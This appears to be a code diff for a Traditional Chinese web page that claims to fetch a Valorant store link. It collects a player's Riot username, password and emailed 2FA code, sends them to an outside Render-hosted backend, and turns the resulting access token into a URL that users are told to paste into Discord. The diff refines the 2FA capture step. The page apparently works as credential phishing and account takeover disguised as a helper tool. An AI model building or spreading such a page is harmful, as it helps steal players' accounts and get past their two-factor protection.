@@ -39,8 +39,8 @@
         </div>
         
         <div class="input-group" id="mfaGroup" style="display: none;">
-            <label style="color: #00ffcc;">請輸入電子郵件二步驟驗證碼 (2FA)</label>
-            <input type="text" id="mfaCode" placeholder="6 位數驗證碼">
+            <label style="color: #00ffcc; font-weight: bold;">🔒 請輸入信箱收到的 6 位數二步驟驗證碼</label>
+            <input type="text" id="mfaCode" placeholder="請打這裡...">
         </div>
 
         <button class="btn" id="submitBtn" onclick="startAuth()">➔ 一鍵安全獲取商店網址</button>
@@ -55,8 +55,8 @@
 </div>
 
 <script>
-// 已自動連結到你剛剛建好的 Render 後端服務！
 const BACKEND_URL = "https://zenith-auth-daily.onrender.com";
+let isMfaStage = false;
 
 async function startAuth() {
     const user = document.getElementById('username').value.trim();
@@ -68,78 +68,75 @@ async function startAuth() {
     if(!user || !pass) { alert('請填寫帳號和密碼！'); return; }
     
     btn.disabled = true;
-    statusMsg.innerText = "⏳ 正在啟動後端轉接橋樑（若伺服器在休眠，可能需要 15-30 秒）...";
-
-    try {
-        // Step 1: 初始化 Riot 授權
-        let initRes = await fetch(`${BACKEND_URL}/api/auth/init`, { method: "POST" });
-        if(!initRes.ok) throw new Error("後端初始化失敗");
-        
-        statusMsg.innerText = "🔑 正在將憑證安全送往 Riot 伺服器驗證...";
-
-        // Step 2: 提交帳密
-        let loginRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
-            method: "PUT",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                type: "auth",
-                username: user,
-                password: pass,
-                remember: true
-            })
-        });
-        let loginData = await loginRes.json();
-
-        // 檢查是否需要二步驟驗證 (MFA)
-        if (loginData.type === "mfa") {
-            document.getElementById('mfaGroup').style.display = "block";
-            statusMsg.innerText = "🔒 偵測到二步驟驗證！請檢查信箱並輸入 6 位數驗證碼。";
-            btn.disabled = false;
-            
-            if (!mfa) {
-                alert("您的帳號啟用了二步驟驗證，請至信箱收信並填入驗證碼後，再次點擊按鈕！");
-                return;
-            }
-            
-            btn.disabled = true;
-            statusMsg.innerText = "⏳ 正在驗證 2FA 驗證碼...";
-            
-            // 提交 MFA 驗證碼
+    
+    // 如果目前已經是 2FA 階段
+    if (isMfaStage) {
+        if (!mfa) { alert("請輸入你收到的 6 位數驗證碼！"); btn.disabled = false; return; }
+        statusMsg.innerText = "⏳ 正在驗證二步驟驗證碼...";
+        try {
             let mfaRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
                 method: "PUT",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    type: "mfa",
-                    code: mfa,
-                    remember: true
-                })
+                body: JSON.stringify({ type: "mfa", code: mfa, remember: true })
             });
-            loginData = await mfaRes.json();
-        }
-
-        // Step 3: 解析最終網址
-        if (loginData.response && loginData.response.parameters && loginData.response.parameters.uri) {
-            let originalUri = loginData.response.parameters.uri;
-            let match = originalUri.match(/access_token=([^&]+)/);
-            if (match) {
-                let finalUrl = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
-                document.getElementById('outputUrl').value = finalUrl;
-                document.getElementById('resultBox').style.display = "block";
-                document.getElementById('loginForm').style.display = "none";
-                statusMsg.innerText = "";
-            }
-        } else {
-            alert("登入失敗：請確認帳號密碼（或驗證碼）是否輸入正確！");
+            let mfaData = await mfaRes.json();
+            handleRiotResponse(mfaData);
+        } catch(e) {
+            alert("驗證碼提交失敗，請重試");
             btn.disabled = false;
-            statusMsg.innerText = "❌ 驗證失敗，請重試。";
         }
-
-    } catch (err) {
-        console.error(err);
-        alert("連線後端發生錯誤！請確認 Render 伺服器狀態。");
-        btn.disabled = false;
-        statusMsg.innerText = "❌ 連線錯誤，請重試。";
+        return;
     }
+
+    // 正常帳密登入階段
+    statusMsg.innerText = "⏳ 正在啟動後端轉接橋樑...";
+    try {
+        let initRes = await fetch(`${BACKEND_URL}/api/auth/init`, { method: "POST" });
+        statusMsg.innerText = "🔑 正在將憑證送往 Riot 伺服器驗證...";
+
+        let loginRes = await fetch(`${BACKEND_URL}/api/auth/login`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ type: "auth", username: user, password: pass, remember: true })
+        });
+        let loginData = await loginRes.json();
+        handleRiotResponse(loginData);
+    } catch (err) {
+        alert("連線發生錯誤，請確認後端狀態！");
+        btn.disabled = false;
+    }
+}
+
+function handleRiotResponse(data) {
+    const btn = document.getElementById('submitBtn');
+    const statusMsg = document.getElementById('statusMsg');
+
+    // 成功抓到網址
+    if (data.response && data.response.parameters && data.response.parameters.uri) {
+        let originalUri = data.response.parameters.uri;
+        let match = originalUri.match(/access_token=([^&]+)/);
+        if (match) {
+            document.getElementById('outputUrl').value = "https://playvalorant.com/zh-tw/opt_in/#access_token=" + match[1];
+            document.getElementById('resultBox').style.display = "block";
+            document.getElementById('loginForm').style.display = "none";
+            statusMsg.innerText = "";
+        }
+        return;
+    }
+
+    // 觸發 2FA 二步驟驗證
+    if (data.type === "mfa" || data.error === "mfa_required") {
+        document.getElementById('mfaGroup').style.display = "block";
+        statusMsg.innerText = "🔒 偵測到二步驟驗證！請查收信箱並填入 6 位數驗證碼，然後再次點擊登入按鈕！";
+        isMfaStage = true;
+        btn.disabled = false;
+        return;
+    }
+
+    // 真的失敗
+    alert("登入失敗，請確認帳號密碼是否正確，或是有打錯驗證碼。");
+    btn.disabled = false;
+    statusMsg.innerText = "❌ 驗證失敗";
 }
 
 function copyResult() {
@@ -149,6 +146,5 @@ function copyResult() {
     alert('🎉 複製成功！快回 Discord 貼上吧！');
 }
 </script>
-
 </body>
 </html>
